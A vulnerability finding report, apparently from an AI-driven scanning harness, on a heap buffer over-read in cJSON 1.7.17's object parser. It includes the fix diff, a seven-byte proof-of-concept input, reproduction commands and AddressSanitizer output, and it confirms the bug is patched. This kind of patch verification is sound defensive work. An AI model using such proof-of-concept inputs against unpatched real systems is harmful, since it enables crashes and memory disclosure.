# Finding: cJSON 1.7.17, CWE-125 Heap Buffer Over-read in `parse_object`

- **Target:** [DaveGamble/cJSON](https://github.com/DaveGamble/cJSON) (~11k★)
- **Vulnerable:** v1.7.17, commit `3ef4e4e^` (parent of the fix)
- **Fixed:** commit `3ef4e4e` (2024-04-30), *"Fix heap buffer overflow"* (issue #800)
- **Class:** CWE-125 (Out-of-bounds Read), ASan `heap-buffer-overflow`, READ of size 1
- **Verdict:** ✅ verified on `sabba-dev`
- **Method:** variant analysis from the fix + test commits; reasoning model = Claude (driving the harness), verifier = Sabba ASan oracle.

## Root cause
In `parse_object`, after consuming a `,` separator, the parser advanced and read the next
member **name without checking that any bytes remain**. With a buffer parsed at its *exact*
length (no NUL terminator), an object source ending in a comma makes `parse_string` read one
byte past the heap allocation.

```c
// parse_object loop, BEFORE the fix, no bounds check after the comma:
        current_item = new_item;
    }
    /* parse the name of the child */          // <-- reached even when input ended at ','
    input_buffer->offset++;
    buffer_skip_whitespace(input_buffer);
    if (!parse_string(current_item, input_buffer)) { goto fail; }   // OOB read
```
The fix inserts, right after `current_item = new_item;`:
```c
+   if (cannot_access_at_index(input_buffer, 1)) {
+       goto fail; /* nothing comes after the comma */
+   }
```

## How it was found (find -> verify -> report)
1. **Recon.** `git log -i -E --grep="overflow|buffer|bounds"` -> `3ef4e4e "Fix heap buffer overflow"`,
   with adjacent test commit `826cd6f` revealing the trigger strings `"{\"1\":1,"` parsed via
   `cJSON_ParseWithLength` on a `malloc(len)` (exact-size) buffer.
2. **Reason.** The fix adds a post-comma bounds check ⇒ the bug is an OOB read of the next
   member name when the object ends at a comma and the buffer is not NUL-terminated.
3. **Harness.** A driver that `malloc(n)`s the *exact* file size (no NUL) and calls
   `cJSON_ParseWithLength(buf, n)`.
4. **Verify.** PoC `{"1":1,` (7 bytes) -> ASan `heap-buffer-overflow` READ in `parse_string`.

## Reproduce
```bash
cd ~/scans/cJSON && git checkout 3ef4e4e^ && cp cJSON.c cJSON.h ~/scans/cjson_heap/
printf %s '{"1":1,' > ~/scans/cjson_heap/obj.json     # 7 bytes, NO trailing NUL/newline
python -m sabba.cli try ~/scans/cjson_heap --argv ~/scans/cjson_heap/obj.json --evidence
#   -> verified=True  reason=sanitizer_triggered  class=heap-buffer-overflow
```
Driver (`heapdrv.c`) uses `malloc(n)` (exact size) + `cJSON_ParseWithLength(buf, n)`, the
missing NUL terminator is what turns the over-read into an out-of-bounds heap access.

## Evidence (AddressSanitizer)
```
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000017
READ of size 1 at 0x602000000017 thread T0
    #0 ... in parse_string  cJSON.c:787
    #1 ... in parse_object  cJSON.c:1666      <-- reads member name after a trailing comma
    #2 ... in parse_value   cJSON.c:1366
    #3 ... in cJSON_ParseWithLengthOpts cJSON.c:1126
```

## Fix confirmation
Same PoC against `3ef4e4e` (with the post-comma `cannot_access_at_index` guard):
```
python -m sabba.cli try ~/scans/cjson_heap --argv ~/scans/cjson_heap/obj.json
#   -> verified=False  reason=no_crash
```
Present in `3ef4e4e^`, fixed in `3ef4e4e`, the (vuln, fix) pair for the data flywheel.
